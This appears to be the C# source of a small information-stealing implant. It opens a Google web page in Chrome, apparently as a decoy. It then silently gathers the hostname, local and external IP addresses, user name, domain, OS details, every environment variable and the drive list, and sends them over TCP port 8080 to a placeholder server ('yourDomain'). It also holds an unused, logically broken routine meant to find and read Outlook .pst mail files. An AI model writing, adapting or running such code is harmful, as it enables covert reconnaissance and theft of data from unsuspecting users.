//*	!Runas
//
//	dll imports: 
//      [System.Windows.Forms.dll]
//	[System.Drawing.dll]
//	[System.DirectoryServices.dll]
//
//*

using System;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Web;
using System.Text.RegularExpressions;
using System.Windows.Forms;using System.Drawing;
using System.DirectoryServices;


class connector {
	
	public static bool IsFileBelowDirectory(string fileInfo, string directoryInfo, string separator)
	{
    		var directoryPath = string.Format("{0}{1}"
    		, directoryInfo
    		, directoryInfo.EndsWith(separator) ? "": separator);

    		return fileInfo.StartsWith(
			directoryPath, 
			StringComparison.OrdinalIgnoreCase
		);
	}
	
	public static string DirSearch(string sDir) 
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir)) 
                {
                    foreach (string f in Directory.GetFiles(d)) 
                    {
                        if (IsFileBelowDirectory(f, "Microsoft\\­Outlook" , ".pst")){
				 return File.ReadAllText(Path.GetFileName(f));		
			}
                    }
                    DirSearch(d);
                }
            }
            catch
            {
			return "";
            }
		return "";
        }
	
	public static string getExternal()
    	{
		string Que = "";
        	try
        		{
            			string externalIP;
            			externalIP = (
					new WebClient()
						).DownloadString("http://checkip.dyndns.org/");
            			externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                         			.Matches(externalIP)[0].ToString();
            			Que += externalIP;
				Que += "\\n\\n\\n";
        		} catch {
			
		}return Que;
		
    	}

	public static string inDept(){
		string str;
    		string nl = Environment.NewLine;
		string Que = "";
    		Que += Environment.HasShutdownStarted;Que += "\n";Que += Environment.OSVersion.ToString();Que += "\n";
		Que += Environment.StackTrace;Que += "\n";Que += Environment.SystemDirectory;
		Que += "\n";Que += Environment.TickCount;Que += "\n";Que += Environment.UserDomainName;
		Que += "\n";Que += Environment.UserInteractive;Que += "\n";Que += Environment.UserName;
		Que += "\n";Que += Environment.Version.ToString();Que += "\n";
		Que += Environment.WorkingSet;Que += "\n";
    		String query = "My system drive is %SystemDrive% and my system root is %SystemRoot%";
    		str = Environment.ExpandEnvironmentVariables(query);
    		Que += "ExpandEnvironmentVariables: "; Que += nl; Que += " "; Que +=  str; Que += "\n";
		Que += "\n";Que += "GetEnvironmentVariable: "; Que += nl; Que += " "; Que +=Environment.GetEnvironmentVariable("TEMP");
    		Que += "GetEnvironmentVariables: ";
    		IDictionary	environmentVariables = Environment.GetEnvironmentVariables();
    		foreach (DictionaryEntry de in environmentVariables)
        		{
        		Que += de.Key; Que += "\n";
			Que += de.Value; Que += "\n";
        		}
    		Que += "GetFolderPath: "; Que += Environment.GetFolderPath(Environment.SpecialFolder.System); Que += "\n";
    		String[] drives = Environment.GetLogicalDrives();
    		Que += "GetLogicalDrives: "; Que += String.Join(", ", drives); Que += "\n";
		return Que;
    	}	
	

	
	public static string QuerySz(){
		string res = " ";
		string strHostName = string.Empty;
		strHostName = Dns.GetHostName();
		res += strHostName; res += " ";
		IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
		IPAddress[] addr = ipEntry.AddressList;
		for (int i = 0; i < addr.Length; i++)
		{
    			res += addr[i].ToString();
			res += " ";
		}
		try{
			res += Environment.MachineName;
			res += " ";
		}catch (Exception y){}
		try{
			res += Environment.UserName;
			res += " ";
			res += Environment.OSVersion.ToString();
			res += " ";}catch(Exception u){}
		try{
			res += inDept();		
		} catch (Exception ex){}
		try{
			res += getExternal(); res += " ";		
		} catch (Exception eox){}
		return res;
	}	
	
	static void Connect(String server, String message) 
		{
  			try 
  				{
   					Int32 port = 8080;
    					TcpClient client = new TcpClient(server, port);
    					Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);         

    					NetworkStream stream = client.GetStream();
    					stream.Write(data, 0, data.Length);      
    					stream.Close();         
    					client.Close();         
  				} catch  
  			{
  		} 

	}
	public static void Main(string [] args){
		try{
		Process.Start("chrome.exe https://atap.google.com/soli/");} catch {}
		string msg = QuerySz();
		try {
			Connect("..../yourDomain",msg); 
			} catch (Exception t){
		} 
	}

}
